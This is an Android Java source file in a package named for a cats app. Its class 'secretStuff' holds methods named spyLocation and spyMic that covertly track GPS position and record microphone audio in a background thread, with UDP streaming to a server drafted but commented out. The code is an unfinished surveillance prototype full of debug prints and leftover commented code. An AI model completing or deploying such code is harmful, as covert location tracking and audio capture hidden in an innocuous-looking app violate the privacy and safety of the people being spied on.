package com.example.cats;

import android.content.Context;
import android.location.*;
import android.os.Bundle;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.lang.Thread;

public class secretStuff {
	
	protected LocationListener locationListener;
	protected LocationManager locationManager;
	protected void spyLocation(Context context, int frequency) {
		
		//Get a reference to system location manager
		locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		//Make a listener that looks for location updates
		locationListener = new LocationListener() {
			public void onLocationChanged(Location location) {
				//Do something with this location
			}
			public void onStatusChanged(String provider, int status, Bundle extras) {}
			public void onProviderEnabled(String provider) {}
			public void onProviderDisabled(String provider) {}
		};
		
		//Register the listener with the location manager
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,frequency,0, locationListener);
		
		System.out.println("Listener setup maybe?");
	}
	
	protected void getLocation()
	{
		String locationProvider = LocationManager.GPS_PROVIDER;
		Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
		
		System.out.print("GPS : ");
		System.out.println(lastKnownLocation.getLongitude());
		System.out.println(lastKnownLocation.getLatitude());
	}
	
	protected void stopLocationListen(Context context)
	{
		locationManager.removeUpdates(locationListener);
	}
	
	protected boolean status = true;
	public byte[] buffer;
	protected MediaRecorder record;
	protected AudioRecord recorder;
	private int sampleRate = 44100;
	private int channelConfig = AudioFormat.CHANNEL_IN_MONO;
	private int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
	int minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
	protected void spyMic()
	{
		status = true;
		//record = new MediaRecorder();
		//record.setAudioSource(MediaRecorder.AudioSource.MIC);
		//record.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		//record.setOutputFile("spyMic");
		
       // try {
       //     record.prepare();
      //  } catch (IOException e) {
       //     System.out.println("prepare() failed");
     //   }

      //  record.start();
		minBufSize += 2048;
        
        //Stream media to server
        Thread streamThread = new Thread(new Runnable() {
        	public void run() {
        		try {
        			DatagramSocket socket = new DatagramSocket();
        			System.out.println("Socket Created for stream");
        			byte[] buffer = new byte[minBufSize];
        			
        			DatagramPacket packet;
        			//final InetAddress destination = InetAddress.getByName(host)
        			recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,sampleRate,channelConfig,audioFormat,minBufSize*10);
        			System.out.println("Recorder initialized");
        			recorder.startRecording();
        			
        			while(status==true)
        			{
        				//Read data from MIC into buffer
        				minBufSize = recorder.read(buffer,0,buffer.length);
        				
        				System.out.print("Media buffer ");
        				System.out.println(buffer);
        				//Put buffer in packet
        				//packet = new DatagramPacket(buffer,buffer.length,destination,port);
        				
        				//socket.send(packet);
        			}
        		} catch(IOException e) {
        			System.out.println("IOException in stream");
        		}
        	}
        });
        streamThread.start();
	}
	
	protected void stopMic()
	{
		status = false;
		recorder.release();
		System.out.println("Recorder released");
		//record.stop();
		//record.release();
		//record = null;
	}
	
	
	
}